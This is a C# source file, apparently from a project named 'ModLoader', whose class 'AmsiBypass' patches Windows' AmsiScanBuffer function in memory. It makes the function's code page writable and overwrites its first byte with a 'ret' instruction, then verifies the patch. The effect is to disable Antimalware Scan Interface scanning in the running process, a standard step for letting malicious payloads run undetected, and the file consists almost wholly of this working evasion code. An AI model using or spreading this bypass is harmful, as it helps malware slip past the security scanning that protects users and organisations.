using System;
using System.Runtime.InteropServices;

namespace ModLoader
{
    public class AmsiBypass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        public static void AmsiBypassStringReplace()
        {
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            if (hAmsi == IntPtr.Zero)
            {
                Console.WriteLine($"LoadLibrary failed for amsi.dll: {Marshal.GetLastWin32Error()}");
                return;
            }
            IntPtr amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (amsiScanBuffer == IntPtr.Zero)
            {
                Console.WriteLine($"GetProcAddress failed for AmsiScanBuffer: {Marshal.GetLastWin32Error()}");
                return;
            }
            uint oldProtect;
            Console.WriteLine($"Patching AmsiScanBuffer in amsi.dll at {amsiScanBuffer.ToInt64():X}");
            if (!VirtualProtect(amsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, out oldProtect))
            {
                Console.WriteLine($"VirtualProtect failed at {amsiScanBuffer.ToInt64():X}: {Marshal.GetLastWin32Error()}");
                return;
            }
            byte[] ret = { 0xC3 }; // ret instruction
            if (!WriteProcessMemory(GetCurrentProcess(), amsiScanBuffer, ret, ret.Length, out int bytesWritten))
                Console.WriteLine($"WriteProcessMemory failed at {amsiScanBuffer.ToInt64():X}: {Marshal.GetLastWin32Error()}");
            else
            {
                Console.WriteLine($"Successfully patched AmsiScanBuffer in amsi.dll at {amsiScanBuffer.ToInt64():X}");
                // Verify patch
                byte[] verifyBuffer = new byte[ret.Length];
                if (ReadProcessMemory(GetCurrentProcess(), amsiScanBuffer, verifyBuffer, verifyBuffer.Length, out int bytesReadVerify) &&
                    verifyBuffer[0] == 0xC3)
                    Console.WriteLine($"Patch verified at {amsiScanBuffer.ToInt64():X}: ret instruction");
                else
                    Console.WriteLine($"Patch verification failed at {amsiScanBuffer.ToInt64():X}: not ret instruction");
            }
            VirtualProtect(amsiScanBuffer, 1, oldProtect, out _);
        }
    }
}